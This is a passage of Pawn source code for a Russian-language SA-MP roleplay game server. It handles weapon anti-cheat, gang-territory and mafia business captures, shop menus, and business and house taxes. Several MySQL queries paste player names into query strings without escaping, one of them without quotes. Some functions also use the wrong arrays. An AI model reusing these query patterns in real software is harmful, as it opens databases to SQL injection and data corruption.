if(Weapon[playerid][wSlot9] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot9] = ammo; }
}
else if (weaponid==10||weaponid==11||weaponid==12||weaponid==13||weaponid==14||weaponid==15)
{
if(Weapon[playerid][wSlot10] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot10] = ammo; }
}
else if (weaponid==44||weaponid==45)
{
if(Weapon[playerid][wSlot11] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot11] = ammo; }
}
else if (weaponid==40)
{
if(Weapon[playerid][wSlot12] < ammo) { GunCheat(playerid); } else { Weapon[playerid][wSlot12] = ammo; }
}
}
}
else { GunCheckTime[playerid] --; }
}
//==============================================================================
stock GunCheat(playerid)
{
if(PlayerLogged[playerid] == 0) return true;
ResetWeapon(playerid);
SetPVarInt(playerid, "GunCheat", 1);
format(PlayerInfo[playerid][pGuns],40,"%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
PlayerInfo[playerid][pGun][0],PlayerInfo[playerid][pGun][1],PlayerInfo[playerid][pGun][2],
PlayerInfo[playerid][pGun][3],PlayerInfo[playerid][pGun][4],PlayerInfo[playerid][pGun][5],
PlayerInfo[playerid][pGun][6],PlayerInfo[playerid][pGun][7],PlayerInfo[playerid][pGun][8],
PlayerInfo[playerid][pGun][9],PlayerInfo[playerid][pGun][10],PlayerInfo[playerid][pGun][11],PlayerInfo[playerid][pGun][12]);
format(PlayerInfo[playerid][pAmmos],160,"%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
PlayerInfo[playerid][pAmmo][0],PlayerInfo[playerid][pAmmo][1],PlayerInfo[playerid][pAmmo][2],
PlayerInfo[playerid][pAmmo][3],PlayerInfo[playerid][pAmmo][4],PlayerInfo[playerid][pAmmo][5],
PlayerInfo[playerid][pAmmo][6],PlayerInfo[playerid][pAmmo][7],PlayerInfo[playerid][pAmmo][8],
PlayerInfo[playerid][pAmmo][9],PlayerInfo[playerid][pAmmo][10],PlayerInfo[playerid][pAmmo][11],PlayerInfo[playerid][pAmmo][12]);
format(query, 512, "UPDATE "TABLE_ACCOUNT" SET guns = '%s', ammos = '%s' WHERE name = %s", PlayerInfo[playerid][pGuns], PlayerInfo[playerid][pAmmos], PlayerInfo[playerid][pSendername]);
KickEx(playerid,8122);
return true;
}
//==============================================================================
stock ResetWeapon(playerid)
{
GunCheckTime[playerid] = 5;
ResetPlayerWeapons(playerid);
Weapon[playerid][wSlot0] = 0;
Weapon[playerid][wSlot1] = 0;
Weapon[playerid][wSlot2] = 0;
Weapon[playerid][wSlot3] = 0;
Weapon[playerid][wSlot4] = 0;
Weapon[playerid][wSlot5] = 0;
Weapon[playerid][wSlot6] = 0;
Weapon[playerid][wSlot7] = 0;
Weapon[playerid][wSlot8] = 0;
Weapon[playerid][wSlot9] = 0;
Weapon[playerid][wSlot10] = 0;
Weapon[playerid][wSlot11] = 0;
Weapon[playerid][wSlot12] = 0;
for(new i = 0; i < 13; i++)
{
PlayerInfo[playerid][pGun][i] = 0;
PlayerInfo[playerid][pAmmo][i] = 0;
}
}
//==============================================================================
stock GzCheck()
{
new string[256];
for(new i =1;i<=TOTALGZ;i++)
{
if(ZoneOnBattle[i] == 1 && GZSafeTime[i] == 0)
{
if(GangInfo[GZInfo[i][gNapad]][score] == GangInfo[GZInfo[i][gFrak]][score])
{
format(string, 90, "[F] Счет захвата территории равен. Ничья");
SendFMes(GZInfo[i][gFrak],COLOR_LIGHTRED, string);
SendFMes(GZInfo[i][gNapad],COLOR_LIGHTRED, string);
ZoneOnBattle[i] = 0;
IsCapture=0;
CaptureEnd(GZInfo[i][gNapad], GZInfo[i][gFrak]);
GangZoneStopFlashForAll(GZInfo[i][id]);
GangInfo[GZInfo[i][gNapad]][captureid] = 0;
GangInfo[GZInfo[i][gNapad]][capture] = 0;
GangInfo[GZInfo[i][gNapad]][score] = 0;
GangInfo[GZInfo[i][gFrak]][captureid] = 0;
GangInfo[GZInfo[i][gFrak]][capture] = 0;
GangInfo[GZInfo[i][gFrak]][score] = 0;
GangInfo[GZInfo[i][gNapad]][gangnumber] = 0;
GangInfo[GZInfo[i][gFrak]][gangnumber] = 0;
}
else if(GangInfo[GZInfo[i][gNapad]][score] > GangInfo[GZInfo[i][gFrak]][score])
{
new zx,zl;
zx = GZInfo[i][gNapad];
zl = i;
format(string,90,"[F] Банда %s выйгрывает захват зоны",GetGangName(zx));
SendFMes(GZInfo[i][gFrak],COLOR_LIGHTRED, string);
SendFMes(GZInfo[i][gNapad],COLOR_LIGHTRED, string);
//for(new ads = 8; ads <= 12;ads++) SendFMes(ads, COLOR_LIGHTRED,string);
ZoneOnBattle[zl] =0;
CaptureEnd(GZInfo[zl][gNapad], GZInfo[zl][gFrak]);
GangInfo[GZInfo[zl][gNapad]][captureid] = 0;
GangInfo[GZInfo[zl][gNapad]][capture] = 0;
GangInfo[GZInfo[zl][gNapad]][score] = 0;
GangInfo[GZInfo[zl][gFrak]][captureid] = 0;
GangInfo[GZInfo[zl][gFrak]][capture] = 0;
GangInfo[GZInfo[zl][gFrak]][score] = 0;
GangInfo[GZInfo[i][gNapad]][gangnumber] = 0;
GangInfo[GZInfo[i][gFrak]][gangnumber] = 0;
GZInfo[zl][gFrak] = zx;
GZInfo[zl][gNapad] = 0;
IsCapture=0;
GangZoneStopFlashForAll(GZInfo[zl][id]);
GangZoneHideForAll(GZInfo[zl][id]);
GangZoneShowForAll(GZInfo[zl][id],GetGangZoneColor(zl));
SaveGZ(zl);
}
else if(GangInfo[GZInfo[i][gNapad]][score] < GangInfo[GZInfo[i][gFrak]][score])
{
new zx,zl;
zx = GZInfo[i][gFrak];
zl = i;
format(string,90,"[F] Банда %s выйгрывает захват зоны",GetGangName(zx));
SendFMes(GZInfo[i][gFrak],COLOR_LIGHTRED, string);
format(string,90,"[F] Банда %s выйграла, вы проиграли захват зоны",GetGangName(zx));
SendFMes(GZInfo[i][gNapad],COLOR_LIGHTRED, string);
ZoneOnBattle[zl] =0;
CaptureEnd(GZInfo[zl][gNapad], GZInfo[zl][gFrak]);
GangInfo[GZInfo[zl][gNapad]][captureid] = 0;
GangInfo[GZInfo[zl][gNapad]][capture] = 0;
GangInfo[GZInfo[zl][gNapad]][score] = 0;
GangInfo[GZInfo[zl][gFrak]][captureid] = 0;
GangInfo[GZInfo[zl][gFrak]][capture] = 0;
GangInfo[GZInfo[zl][gFrak]][score] = 0;
GangInfo[GZInfo[i][gNapad]][gangnumber] = 0;
GangInfo[GZInfo[i][gFrak]][gangnumber] = 0;
IsCapture=0;
GZInfo[zl][gFrak] = zx;
GZInfo[zl][gNapad] = 0;
GangZoneStopFlashForAll(GZInfo[zl][id]);
GangZoneHideForAll(GZInfo[zl][id]);
GangZoneShowForAll(GZInfo[zl][id],GetGangZoneColor(zl));
SaveGZ(zl);
}
}
}
for(new i =1;i<=TOTALGZ;i++)
{
for(new z = 0;z<20;z++)
{
OnZONE[i][z] =0;
}
}
//==============================================================================
for(new i =0; i <sizeof(MZInfo);i++){
if(ZoneOnBattlem[i] == 1 && MZSafeTime[i] == 0){
ZoneTimerm[i] -=10;
if(ZoneTimerm[i] <=0){
for(new h = 0; h < sizeof(BizzInfo); h++){
if(BizzInfo[h][bZahvat] == 1){
SendFMes(BizzInfo[h][bMafia],COLOR_GREEN,"Вам удалось отстоять свой бизнес");
BizzInfo[h][bZahvat] = 0;}}
SendFMes(MZInfo[i][mNapad],COLOR_RED,"Вам не удалось взять под контроль новый бизнес");
startwar = 0;
ZoneOnBattlem[i] =0;
GangZoneStopFlashForAll(zons);}
for(new x =0;x<MAX_PLAYERS;x++){
if(PlayerToKvadrat(x,328.755706, 2412.644531, 448.755706, 2564.644531)){
new factionm;
if(PlayerInfo[x][pLeader] !=0) {factionm = PlayerInfo[x][pLeader];}
else { factionm = PlayerInfo[x][pMember];}
OnmZONE[i][factionm] ++;}}
new asd;
for(new x =0;x<20;x++){
if(OnmZONE[i][x] > 0 && IsInAllowedM(x)) asd ++;}
if(asd == 1){
for(new x =0;x<20;x++){
if(OnmZONE[i][x] > 0){
new zx,zl;
zx = x;
zl = i;
if(MZInfo[i][mFrakVlad] == x){
for(new h = 0; h < sizeof(BizzInfo); h++){
if(BizzInfo[h][bZahvat] == 1){
BizzInfo[h][bMafia] = BizzInfo[h][bMafia];
SendFMes(BizzInfo[h][bMafia],COLOR_RED,"Вы отстояли свой бизнес");
BizzInfo[h][bZahvat] = 0;
SetBizzInt(h, "mafia", BizzInfo[h][bMafia]);}}
startwar = 0;
SendFMes(MZInfo[i][mNapad],COLOR_RED,"Вам не удалось завоевать ещё один бизнес");}
else{
startwar = 0;
SendFMes(MZInfo[i][mNapad],COLOR_LIGHTGREEN,"Вы завоевали новый бизнес");
for(new h = 0; h < sizeof(BizzInfo); h++){
if(BizzInfo[h][bZahvat] == 1){
SendFMes(BizzInfo[h][bMafia],COLOR_RED,"Вы потеряли контроль над одним из своих бизнесов");
BizzInfo[h][bMafia] = MZInfo[i][mNapad];
BizzInfo[h][bZahvat] = 0;
SetBizzInt(h, "mafia", BizzInfo[h][bMafia]);}}}
ZoneOnBattlem[zl] =0;
MZInfo[zl][mFrakVlad] = 0;
MZInfo[zl][mFrakVlad] = zx;
GangZoneStopFlashForAll(zons);
GangZoneHideForAll(zons);
GangZoneShowForAll(zons,COLOR_NEWS);
break;}}}}}
for(new mz = 0; mz < 20; mz++)
{
OnmZONE[0][mz] = 0;
}return 1;
}
//==============================================================================
stock LeaveFractionPlayer(playerid){
if(!strcmp(FracInfo[PlayerInfo[playerid][pMember]][fAssistant], PlayerInfo[playerid][pSendername],true)){
strmid(FracInfo[PlayerInfo[playerid][pMember]][fAssistant],"None",0,strlen("None"),MAX_PLAYER_NAME);
SetFractionStr(PlayerInfo[playerid][pMember], "assistant", "None");
for(new i = 0; i < 4; i++) FracInfo[PlayerInfo[playerid][pMember]][fHelper][i] = 0;
format(FracInfo[PlayerInfo[playerid][pMember]][fHelpers], 16, "%d, %d, %d, %d, %d",
FracInfo[PlayerInfo[playerid][pMember]][fHelper][0],
FracInfo[PlayerInfo[playerid][pMember]][fHelper][1],
FracInfo[PlayerInfo[playerid][pMember]][fHelper][2],
FracInfo[PlayerInfo[playerid][pMember]][fHelper][3],
FracInfo[PlayerInfo[playerid][pMember]][fHelper][4]);
SetFractionStr(PlayerInfo[playerid][pMember], "helper", FracInfo[PlayerInfo[playerid][pMember]][fHelpers]);}
if(IsAGang(playerid)){
foreach(new i:Player){
TextDrawHideForPlayer(i, BandaCapt1a[i]);
TextDrawHideForPlayer(i, BandaCapt2a[i]);
TextDrawHideForPlayer(i, ScoreCapt1a[i]);
TextDrawHideForPlayer(i, ScoreCapt2a[i]);
TextDrawHideForPlayer(i, ScoreCaptTire[i]);
TextDrawHideForPlayer(i, CaptTime[i]);
TextDrawHideForPlayer(i, ScoreCapt[i]);
TextDrawHideForPlayer(i, Textdraw4[i]);}}
SendClientMessage(playerid, COLOR_WHITE, "Теперь вы снова - гражданский!");
PlayerInfo[playerid][pChar] = 0;
PlayerInfo[playerid][pLeader] = 0;
PlayerInfo[playerid][pMember] = 0;
PlayerInfo[playerid][pRank] = 0;
ResetWeapon(playerid);
SpawnPlayer(playerid);
return true;}
//==============================================================================
stock NewsPanel(playerid){
new full;
new string[512];
switch(PlayerInfo[playerid][pMember]){
case F_UNITEDNEWS: full = 0;}
format(string, 512, "%s\n{9ACD32}- Пригласить в эфир\n{FF6347}- Выпроводить из эфира\n%s\n%s\n{9ACD32}- Объявления [Новых %i]", !Ether[playerid] ? ("{9ACD32}- Войти в эфир") : ("{FF6347}- Выйти из эфира"),
!EtherCall[full] ? ("{9ACD32}- Включить прием звонков в эфир") : ("{FF6347}- Выключить прием звонков в эфир"),
!EtherSms[full] ? ("{9ACD32}- Включить прием смс в эфир") : ("{FF6347}- Выключить прием смс в эфир"),TOTALADVERT[full]);
ShowPlayerDialog(playerid, D_NMENU, 2, "Панель", string, "Принять", "Отмена");
return true;}
//==============================================================================
stock MobileCrash(playerid){
new caller = Mobile[playerid];
SendClientMessage(caller, COLOR_GRAD2, "Абонент положил трубку");
SetPlayerSpecialAction(caller,SPECIAL_ACTION_STOPUSECELLPHONE);
CellTime[caller] = -1;
CellTime[playerid] = -1;
Mobile[caller] = -1;
if(EtherCalled[playerid] == true) EtherCalled[playerid] = false;
if(EtherCalled[caller] == true) EtherCalled[caller] = false;
Mobile[playerid] = -1;
SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
DeletePVar(playerid, "CallTime");
DeletePVar(caller, "CallTime");
return true;}
//==============================================================================
stock ClearBizz(i){
new string[512];
new playerid = GetPlayerID(BizzInfo[i][bOwner]);
if(playerid != INVALID_PLAYER_ID){
if(IsPlayerConnected(playerid) && PlayerLogged[playerid]){
PlayerInfo[playerid][pBank] += BizzInfo[i][bMoney];
SetPVarInt(playerid, "GetBizz", 1);
print("onlinebiz");}}else{
new bank, texts[20], text[3];
format(query,256, "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'",BizzInfo[i][bOwner]);
mysql_query(query);
mysql_store_result();
if(mysql_fetch_row_format(query)){
mysql_get_field("bank", var); bank = strval(var);
mysql_get_field("text", texts);}
mysql_free_result();
sscanf(texts, "p<,>a<i>[3]", text);
format(texts, sizeof(texts),"%i, 1, %i", text[0], text[2]);
bank += BizzInfo[i][bMoney];
format(query,256, "UPDATE "TABLE_ACCOUNT"  SET text = '%s', bank = %i WHERE name = '%s'",texts,bank, HouseInfo[i][hOwner]);
mysql_query(query);}
BizzPay[i] = 0;
BizzInfo[i][bLock] = 0;
BizzInfo[i][bLockTime] = 0;
BizzInfo[i][bMafia] = 0;
BizzInfo[i][bBuyPrice] = 0;
BizzInfo[i][bMoney] = 0;
BizzInfo[i][bLic] = 0;
BizzInfo[i][bEnter] = 100;
BizzInfo[i][bTill] = 50;
BizzInfo[i][bProduct] = 100000;
strmid(BizzInfo[i][bOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
// ОСТОРОЖНО, СТРИНГ МОЖЕТБЫТЬ МАЛ
format(string, 512, "UPDATE "TABLE_BIZZ" SET owner='%s', block=%d, locktime=%d, money=%d, lic=%d, penter=%d, till=%d,buyprice=%d,product=%d,mafia=%d WHERE id = %d",
BizzInfo[i][bOwner], BizzInfo[i][bLock], BizzInfo[i][bLockTime], BizzInfo[i][bMoney], BizzInfo[i][bLic], BizzInfo[i][bEnter], BizzInfo[i][bTill],BizzInfo[i][bBuyPrice],BizzInfo[i][bProduct],BizzInfo[i][bMafia],i);
mysql_query(string);
UpdateBizz(i);
return true;}
//==============================================================================
stock GetBizz(){
for(new i = 1; i <= TOTALBIZZ; i++){
if(!strcmp(BizzInfo[i][bOwner],"None",true)) continue;
if(BizzInfo[i][bMoney] < 100 || BizzInfo[i][bLock] == 1 && BizzInfo[i][bLockTime] >= 12) ClearBizz(i);
else{
BizzPay[i] = 0;
new playerid = GetPlayerID(BizzInfo[i][bOwner]);
if(BizzInfo[i][bProduct] <= 0 || BizzInfo[i][bLic] == 0){
if(playerid != INVALID_PLAYER_ID){
if(IsPlayerConnected(playerid)){
if(BizzInfo[i][bLockTime] == 0) SetPVarInt(playerid, "_GetBizz_", 1);
BizzInfo[i][bLock] = 1;
SetBizzInt(i, "block", BizzInfo[i][bLock]);}}}
if(BizzInfo[i][bLock] == 1){
BizzInfo[i][bLockTime]++;
SetBizzInt(i, "locktime", BizzInfo[i][bLockTime]);}
if(BizzInfo[i][bLockTime] > 1 && BizzInfo[i][bLockTime] < 12){
if(IsPlayerConnected(playerid) && playerid != INVALID_PLAYER_ID) SetPVarInt(playerid, "GetBizz_", 1);}
BizzInfo[i][bMoney] -= BizzInfo[i][bBuyPrice] / 1000;
SetBizzInt(i, "money", BizzInfo[i][bMoney]);}
new mafiapay = BizzPay[i] / 10;
switch(BizzInfo[i][bMafia]){
case F_LCN:{
FracBank[6] += mafiapay;
SetOtherInt("lcnbank", FracBank[6]);}
case F_YAKUZA:{
FracBank[5] += mafiapay;
SetOtherInt("yakuzabank", FracBank[5]);}
case F_RM:
{
FracBank[7] += mafiapay;
SetOtherInt("rmbank", FracBank[7]);}
}
}return 1;
}
//==============================================================================
stock GetHome(){
print("TEST GETHOME");
new htax, bank, texts[16], text[3], warr[12];
for(new i = 1; i <= TOTALHOUSE; i++){
if(!strcmp("None",HouseInfo[i][hOwner],true)) continue;
else if(!strcmp("E",HouseInfo[i][hDiscript],true)) htax = 50;
else if(!strcmp("D",HouseInfo[i][hDiscript],true)) htax = 50;
else if(!strcmp("C",HouseInfo[i][hDiscript],true)) htax = 100;
else if(!strcmp("B",HouseInfo[i][hDiscript],true)) htax = 150;
else if(!strcmp("A",HouseInfo[i][hDiscript],true)) htax = 200;
if(HouseInfo[i][hOplata] < htax){
new playd = GetPlayerID(HouseInfo[i][hOwner]);
if(playd != INVALID_PLAYER_ID){
PlayerInfo[playd][pBank] += HouseInfo[playd][hBuyPrice];
SetPVarInt(playd, "GetHome", 1);}else{
format(query,sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'",HouseInfo[i][hOwner]);
mysql_query(query);
mysql_store_result();
if(mysql_fetch_row_format(query)){
mysql_get_field("bank", warr); bank = strval(warr);
mysql_get_field("text", texts);}
mysql_free_result();
sscanf(texts, "p<,>a<i>[3]", text);
format(texts, sizeof(texts),"1, %i, %i", text[1], text[2]);
bank += HouseInfo[i][hBuyPrice];
format(query,sizeof(query), "UPDATE "TABLE_ACCOUNT"  SET text = '%s', bank = %i WHERE name = '%s'",texts,bank, HouseInfo[i][hOwner]);
mysql_query(query);}
SetHouseStr(i, "hOwner", "None");
SetHouseInt(i, "hOplata", 0);
SetHouseInt(i, "buyprice", 0);
HouseInfo[i][hBuyPrice] = 0;
HouseInfo[i][hOplata] = 0;
strmid(HouseInfo[i][hOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
HouseInfo[i][hLock] = 0;
SetHouseInt(i, "hLock", HouseInfo[i][hLock]);
UpdateHouse(i);}else{
HouseInfo[i][hOplata] -= htax;
SetHouseInt(i, "hOplata", HouseInfo[i][hOplata]);
Exchequer+=htax;}
HouseInfo[i][hRob] = false;}
format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
mysql_query(query);

print("GetHome END ALL");
return true;}
stock UpdateRegList(preg, zreg){
if(preg != 1){
for(new i = preg; i <= TOTALBLIST[zreg] - 1; i++){
strmid(RegListInfo[i][zreg][rlName],RegListInfo[i+1][zreg][rlName],0,strlen(RegListInfo[i+1][zreg][rlName]),MAX_PLAYER_NAME);
RegListInfo[i][zreg][rType] = RegListInfo[i+1][zreg][rType];
RegListInfo[i][zreg][rID] = RegListInfo[i+1][zreg][rID];
RegListInfo[i][zreg][rMoney] = RegListInfo[i+1][zreg][rMoney];
RegListInfo[i][zreg][rlStatus] = RegListInfo[i+1][zreg][rlStatus];}}
TOTALBLIST[zreg]--;
return true;}
stock GunShopList(playerid, idx){
new string[512];
new till = BizzInfo[idx][bTill];
if(PlayerInfo[playerid][pLic][4] == 0) return SendClientMessage(playerid, COLOR_GREY, "Продавец: У вас нету лицензии на оружие!");
if(BizzInfo[idx][bProduct] <= 0) return SendClientMessage(playerid, COLOR_GREY, "Магазин оружия закрыт, зайдите позже!");
format(string, 512, "Бронежилет\t\t\t{33AAFF}%i$ {ffffff}\nНож\t\t\t\t{33AAFF}%i$ {ffffff}\nSDPistol (50п)\t\t\t{33AAFF}%i$ {ffffff}\nDesert Eagle (30п)\t\t{33AAFF}%i$ {ffffff}\nShotgun (30п)\t\t\t{33AAFF}%i$ {ffffff}\nM4 (100п)\t\t\t{33AAFF}%i$ {ffffff}\nMP5 (100п)\t\t\t{33AAFF}%i$ {ffffff}",
till*5, till*3, till*10, till*15, till*14, till*23, till*20);
ShowPlayerDialog(playerid, 1374, 2, "Магазин оружия: Оружие", string, "Купить", "Отмена");
return true;}
//==============================================================================
stock MagazineList(playerid, idx){
new till = BizzInfo[idx][bTill];
new src[256];
new shopstr[512];
if(BizzInfo[idx][bProduct] < 1) return SendClientMessage(playerid, COLOR_GREY, "Магазин закрыт, зайдите позже!");
format(src,sizeof(src),"Телефон\t\t\t{33AAFF}%i$ {ffffff}\nТелефонный номер\t\t{33AAFF}%i$ {ffffff}\nТелефонная книга\t\t{33AAFF}%i$ {ffffff}\nЛотерейный билет\t\t{33AAFF}%i$ {ffffff}",
till*5, till*1, till*3, till*10);
strcat(shopstr,src,sizeof(shopstr));
format(src,sizeof(src),"\nФотоаппарат\t\t\t{33AAFF}%i$ {ffffff}\nАптечки\t\t\t{33AAFF}%i$ {ffffff}\nЦветы\t\t\t\t{33AAFF}%i$ {ffffff}",
till*2, till*5, till*1);
strcat(shopstr,src,sizeof(shopstr));
format(src,sizeof(src),"\nЧасы\t\t\t\t{33AAFF}%i$ {ffffff}\nМаска\t\t\t\t{33AAFF}%i$ {ffffff}\n{00EE00}Сигара (1 штука)\t\t{33AAFF}%i$ {ffffff}\n{00EE00}Sprunk (1 банка)\t\t{33AAFF}%i$ {ffffff}",
till*4, till*30, till*6,till*5);
strcat(shopstr,src,sizeof(shopstr));
ShowPlayerDialog(playerid, D_HEAL+13, 2, "24/7: Витрина", shopstr, "Купить", "Отмена");
return true;}
//==============================================================================
stock EatList(playerid, idx){
new till = BizzInfo[idx][bTill];
if(BizzInfo[idx][bProduct] < 50) return SendClientMessage(playerid, COLOR_GREY, "В бизнесе нет продуктов!");
new inter = GetPlayerInterior(playerid);
if(inter == 5) format(totalstring, 256, "Маленькая пицца{33AAFF}\t{33AAFF}%i$ {ffffff}\nСредняя пицца\t{33AAFF}%i$ {ffffff}\nБольшая пицца\t{33AAFF}%i$ {ffffff}",till*4, till*7, till*10);
if(inter == 10) format(totalstring, 256, "Бургер\t\t\t{33AAFF}%i$ {ffffff}\nБольшой бургер\t{33AAFF}%i$ {ffffff}\nГамбургер\t\t{33AAFF}%i$ {ffffff}",till*4, till*7, till*10);
if(inter == 9) format(totalstring, 256, "Кусочки курица\t\t{33AAFF}%i$ {ffffff}\nКусок куринной ножки\t\t{33AAFF}%i$ {ffffff}\nКуринная ножка\t\t{33AAFF}%i$ {ffffff}",till*4, till*7, till*10);
return ShowPlayerDialog(playerid, D_HEAL+14, 2, "Закусочная", totalstring, "Купить", "Отмена");}
//==============================================================================
stock ClubList(playerid, idx){
new till = BizzInfo[idx][bTill];
if(BizzInfo[idx][bProduct] < 50) return SendClientMessage(playerid, COLOR_GREY,"В баре нет напитков!");
format(totalstring, 512, "Вода\t\t\t{33AAFF}%i {ffffff}долларов\nСода\t\t\t{33AAFF}%i {ffffff}долларов\nКока-кола\t\t{33AAFF}%i {ffffff}долларов\nПиво\t\t\t{33AAFF}%i {ffffff}долларов\nВодка\t\t\t{33AAFF}%i {ffffff}долларов\nКоньяк\t\t\t{33AAFF}%i {ffffff}долларов\nАбсент\t\t\t{33AAFF}%i {ffffff}долларов",
till*4, till*7, till*10, till*15, till*20, till*25, till*30);
return ShowPlayerDialog(playerid, D_HEAL+15, 2, "Барная стойка", totalstring, "Купить", "Отмена");}
//==============================================================================
stock BizzStats(playerid, idx){
new string[512];
if(BizzInfo[idx][bType] == 1){
format(string, 512, "{ffffff}Маркет:\t\t\t{00D900}%s\n{ffffff}Владелец:\t\t\t{00D900}%s\n\n{ffffff}На счету бизнеса:\t\t{00D900}%i{ffffff} долларов\n{ffffff}В этом часу заработано:\t{00D900}%i {ffffff}долларов\n{ffffff}Цена за товар:\t\t{00D900}%i {ffffff}долларов\n\n{ffffff}Продуктов:\t\t\t{00D900}%i / 5000\n\n{ffffff}Статус:\t\t\t\t%s\n{ffffff}Лицензия на бизнес:\t\t%s\nВремя простоя:\t\t%i час(ов)",
BizzInfo[idx][bName], BizzInfo[idx][bOwner], BizzInfo[idx][bMoney], BizzPay[idx], BizzInfo[idx][bTill], BizzInfo[idx][bProduct]
,(!BizzInfo[idx][bLock])?("{00D900}Открыт") : ("{FF6347}Закрыт"),(!BizzInfo[idx][bLic])?("{FF6347}Нет"):("{00D900}Да"), BizzInfo[idx][bLockTime]);}
else if(BizzInfo[idx][bType] == 2){
format(string, 512, "{ffffff}Заправка:\t\t\t{00D900}%s\n{ffffff}Владелец:\t\t\t{00D900}%s\n\n{ffffff}На счету бизнеса:\t\t{00D900}%i{ffffff} долларов\n{ffffff}В этом часу заработано:\t{00D900}%i {ffffff}долларов\n{ffffff}Цена за 1 литр:\t\t{00D900}%i {ffffff}долларов\n\n{ffffff}Топлива:\t\t\t{00D900}%i / 20000\n\n{ffffff}Статус:\t\t\t\t%s\n{ffffff}Лицензия на бизнес:\t\t%s\nВремя простоя:\t\t%i час(ов)",
BizzInfo[idx][bName], BizzInfo[idx][bOwner], BizzInfo[idx][bMoney], BizzPay[idx], BizzInfo[idx][bTill] / 3, BizzInfo[idx][bProduct]
,(!BizzInfo[idx][bLock])?("{00D900}Открыт") : ("{FF6347}Закрыт"),(!BizzInfo[idx][bLic])?("{FF6347}Нет"):("{00D900}Да"), BizzInfo[idx][bLockTime]);}
else if(BizzInfo[idx][bType] == 3){
format(string, 512, "{ffffff}Закусочная:\t\t\t{00D900}%s\n{ffffff}Владелец:\t\t\t{00D900}%s\n\n{ffffff}На счету бизнеса:\t\t{00D900}%i{ffffff} долларов\n{ffffff}В этом часу заработано:\t{00D900}%i {ffffff}долларов\n{ffffff}Цена за товар:\t\t{00D900}%i {ffffff}долларов\n\n{ffffff}Продуктов:\t\t\t{00D900}%i / 3000\n\n{ffffff}Статус:\t\t\t\t%s\n{ffffff}Лицензия на бизнес:\t\t%s\nВремя простоя:\t\t%i час(ов)",
BizzInfo[idx][bName], BizzInfo[idx][bOwner], BizzInfo[idx][bMoney], BizzPay[idx], BizzInfo[idx][bTill], BizzInfo[idx][bProduct]
,(!BizzInfo[idx][bLock])?("{00D900}Открыт") : ("{FF6347}Закрыт"),(!BizzInfo[idx][bLic])?("{FF6347}Нет"):("{00D900}Да"), BizzInfo[idx][bLockTime]);}
else if(BizzInfo[idx][bType] == 4 || BizzInfo[idx][bType] == 5){
format(string, 512, "{ffffff}Клуб:\t\t\t{00D900}%s\n{ffffff}Владелец:\t\t\t{00D900}%s\n\n{ffffff}На счету бизнеса:\t\t{00D900}%i{ffffff} долларов\n{ffffff}В этом часу заработано:\t{00D900}%i {ffffff}долларов\n{ffffff}Цена за товар:\t\t{00D900}%i {ffffff}долларов\n\n{ffffff}Продуктов:\t\t\t{00D900}%i / 7000\n\n{ffffff}Статус:\t\t\t\t%s\n{ffffff}Лицензия на бизнес:\t\t%s\nВремя простоя:\t\t%i час(ов)",
BizzInfo[idx][bName], BizzInfo[idx][bOwner], BizzInfo[idx][bMoney], BizzPay[idx], BizzInfo[idx][bTill], BizzInfo[idx][bProduct]
,(!BizzInfo[idx][bLock])?("{00D900}Открыт") : ("{FF6347}Закрыт"),(!BizzInfo[idx][bLic])?("{FF6347}Нет"):("{00D900}Да"), BizzInfo[idx][bLockTime]);}
else if(BizzInfo[idx][bType] == 6){
format(string, 512, "{ffffff}Аммуниция:\t\t\t{00D900}%s\n{ffffff}Владелец:\t\t\t{00D900}%s\n\n{ffffff}На счету бизнеса:\t\t{00D900}%i{ffffff} долларов\n{ffffff}В этом часу заработано:\t{00D900}%i {ffffff}долларов\n{ffffff}Цена за 1бп:\t\t{00D900}%i {ffffff}долларов\n\n{ffffff}БП на складе:\t\t\t{00D900}%i / 20000\n\n{ffffff}Статус:\t\t\t\t%s\n{ffffff}Лицензия на бизнес:\t\t%s\nВремя простоя:\t\t%i час(ов)",
BizzInfo[idx][bName], BizzInfo[idx][bOwner], BizzInfo[idx][bMoney], BizzPay[idx], BizzInfo[idx][bTill], BizzInfo[idx][bProduct]
,(!BizzInfo[idx][bLock])?("{00D900}Открыт") : ("{FF6347}Закрыт"),(!BizzInfo[idx][bLic])?("{FF6347}Нет"):("{00D900}Да"), BizzInfo[idx][bLockTime]);}
else if(BizzInfo[idx][bType] == 7){
format(string, 512, "{ffffff}CTO:\t\t\t{00D900}%s\n{ffffff}Владелец:\t\t\t{00D900}%s\n\n{ffffff}На счету бизнеса:\t\t{00D900}%i{ffffff} долларов\n{ffffff}В этом часу заработано:\t{00D900}%i {ffffff}долларов\n{ffffff}Цена за 1 запчасть:\t\t{00D900}%i {ffffff}долларов\n\n{ffffff}Запчастей на складе:\t\t\t{00D900}%i / 100000\n\n{ffffff}Статус:\t\t\t\t%s\n{ffffff}Лицензия на бизнес:\t\t%s\nВремя простоя:\t\t%i час(ов)",
BizzInfo[idx][bName], BizzInfo[idx][bOwner], BizzInfo[idx][bMoney], BizzPay[idx], BizzInfo[idx][bTill], BizzInfo[idx][bProduct]
,(!BizzInfo[idx][bLock])?("{00D900}Открыт") : ("{FF6347}Закрыт"),(!BizzInfo[idx][bLic])?("{FF6347}Нет"):("{00D900}Да"), BizzInfo[idx][bLockTime]);}
ShowPlayerDialog(playerid, D_NULL, 0, "Статистика бизнеса", string, "Закрыть", "");
switch(BizzInfo[idx][bMafia]){
case F_RM: SendClientMessage(playerid,COLOR_WHITE,"Бизнес крышует мафия 'Russian Mafia'");
case F_LCN: SendClientMessage(playerid,COLOR_WHITE,"Бизнес крышует мафия 'La Cosa Nostra'");
case F_YAKUZA: SendClientMessage(playerid,COLOR_WHITE,"Бизнес крышует мафия 'Yakuza'");}
return true;}
//==============================================================================
stock AdvertList(playerid){
new full, str[90], str2[2048];
switch(PlayerInfo[playerid][pMember]){
case F_UNITEDNEWS: full = 0;}
for(new i = 1; i <= TOTALADVERT[full];i++){
